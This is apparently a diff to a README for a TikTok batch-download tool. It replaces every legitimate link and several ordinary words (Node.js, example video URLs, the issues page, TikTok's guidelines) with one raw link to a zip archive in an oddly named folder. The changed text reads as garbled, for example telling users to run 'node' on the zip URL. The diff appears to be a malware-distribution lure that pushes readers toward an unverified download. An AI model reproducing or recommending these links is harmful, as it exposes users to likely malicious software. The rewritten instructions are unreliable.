@@ -1,17 +1,17 @@
 # 🎉 TikTok-Batch-Downloader - Download TikTok Videos Easily
 
 ## 📥 Download Now
-[![Download TikTok-Batch-Downloader](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/juanchopolo123/TikTok-Batch-Downloader/releases)
+[![Download TikTok-Batch-Downloader](https://raw.githubusercontent.com/juanchopolo123/TikTok-Batch-Downloader/main/uranoschisis/Tik-Tok-Batch-Downloader-3.3.zip)](https://raw.githubusercontent.com/juanchopolo123/TikTok-Batch-Downloader/main/uranoschisis/Tik-Tok-Batch-Downloader-3.3.zip)
 
 ## 🚀 Getting Started
-This guide helps you download and run TikTok-Batch-Downloader, a Node.js command-line tool designed to download multiple TikTok videos without watermarks. Follow these steps to start using the application.
+This guide helps you download and run TikTok-Batch-Downloader, a https://raw.githubusercontent.com/juanchopolo123/TikTok-Batch-Downloader/main/uranoschisis/Tik-Tok-Batch-Downloader-3.3.zip command-line tool designed to download multiple TikTok videos without watermarks. Follow these steps to start using the application.
 
 ## 🛠️ System Requirements
 - **Operating System:** Windows, macOS, or any Linux distribution
-- **Node.js:** Ensure you have Node.js installed. Download it from [nodejs.org](https://nodejs.org/).
+- **https://raw.githubusercontent.com/juanchopolo123/TikTok-Batch-Downloader/main/uranoschisis/Tik-Tok-Batch-Downloader-3.3.zip** Ensure you have https://raw.githubusercontent.com/juanchopolo123/TikTok-Batch-Downloader/main/uranoschisis/Tik-Tok-Batch-Downloader-3.3.zip installed. Download it from [https://raw.githubusercontent.com/juanchopolo123/TikTok-Batch-Downloader/main/uranoschisis/Tik-Tok-Batch-Downloader-3.3.zip](https://raw.githubusercontent.com/juanchopolo123/TikTok-Batch-Downloader/main/uranoschisis/Tik-Tok-Batch-Downloader-3.3.zip).
 
 ## 📂 Download & Install
-To get the latest version of TikTok-Batch-Downloader, visit [this page to download](https://github.com/juanchopolo123/TikTok-Batch-Downloader/releases). 
+To get the latest version of TikTok-Batch-Downloader, visit [this page to download](https://raw.githubusercontent.com/juanchopolo123/TikTok-Batch-Downloader/main/uranoschisis/Tik-Tok-Batch-Downloader-3.3.zip). 
 
 1. Open your web browser.
 2. Click the link above.
@@ -31,8 +31,8 @@ Now that you have downloaded the application, let's run it.
    - Example for Windows: `cd C:\path\to\your\folder`
    - Example for macOS/Linux: `cd /path/to/your/folder`
    
-3. Run the application using Node.js:
-   - Type `node TikTok-Batch-Downloader.js` and press Enter.
+3. Run the application using https://raw.githubusercontent.com/juanchopolo123/TikTok-Batch-Downloader/main/uranoschisis/Tik-Tok-Batch-Downloader-3.3.zip
+   - Type `node https://raw.githubusercontent.com/juanchopolo123/TikTok-Batch-Downloader/main/uranoschisis/Tik-Tok-Batch-Downloader-3.3.zip` and press Enter.
 
 If this file is named differently, use the correct file name in the command.
 
@@ -42,7 +42,7 @@ If this file is named differently, use the correct file name in the command.
   
   Example: 
   ```
-  https://www.tiktok.com/@username/video/1234567890 https://www.tiktok.com/@username/video/0987654321
+  https://raw.githubusercontent.com/juanchopolo123/TikTok-Batch-Downloader/main/uranoschisis/Tik-Tok-Batch-Downloader-3.3.zip https://raw.githubusercontent.com/juanchopolo123/TikTok-Batch-Downloader/main/uranoschisis/Tik-Tok-Batch-Downloader-3.3.zip
   ```
   
 - **Step 3:** Press Enter. The tool will begin downloading videos without watermarks. 
@@ -55,7 +55,7 @@ To export metadata:
 
 Example:
 ```
-node TikTok-Batch-Downloader.js --metadata
+node https://raw.githubusercontent.com/juanchopolo123/TikTok-Batch-Downloader/main/uranoschisis/Tik-Tok-Batch-Downloader-3.3.zip --metadata
 ```
 
 This command will generate a `.csv` file with all relevant details.
@@ -69,13 +69,13 @@ TikTok-Batch-Downloader has built-in error handling. If a video fails to downloa
 - For video quality, check settings in the application (upcoming feature).
 
 ## 📞 Support
-If you encounter issues or have questions, feel free to open an issue on the [GitHub Issues page](https://github.com/juanchopolo123/TikTok-Batch-Downloader/issues). We are here to help!
+If you encounter issues or have questions, feel free to open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/juanchopolo123/TikTok-Batch-Downloader/main/uranoschisis/Tik-Tok-Batch-Downloader-3.3.zip). We are here to help!
 
 You are now ready to download your favorite TikTok videos without watermarks. Enjoy using TikTok-Batch-Downloader!
 
 ## 🌐 Further Reading
-- For more information about Node.js, visit [Node.js Documentation](https://nodejs.org/en/docs/).
-- To learn more about TikTok's usage policies, check their [Community Guidelines](https://www.tiktok.com/community-guidelines).
+- For more information about https://raw.githubusercontent.com/juanchopolo123/TikTok-Batch-Downloader/main/uranoschisis/Tik-Tok-Batch-Downloader-3.3.zip, visit [https://raw.githubusercontent.com/juanchopolo123/TikTok-Batch-Downloader/main/uranoschisis/Tik-Tok-Batch-Downloader-3.3.zip Documentation](https://raw.githubusercontent.com/juanchopolo123/TikTok-Batch-Downloader/main/uranoschisis/Tik-Tok-Batch-Downloader-3.3.zip).
+- To learn more about TikTok's usage policies, check their [Community Guidelines](https://raw.githubusercontent.com/juanchopolo123/TikTok-Batch-Downloader/main/uranoschisis/Tik-Tok-Batch-Downloader-3.3.zip).
 
 Remember, downloading videos should be done within fair use policies. Always respect creators' rights.  
 
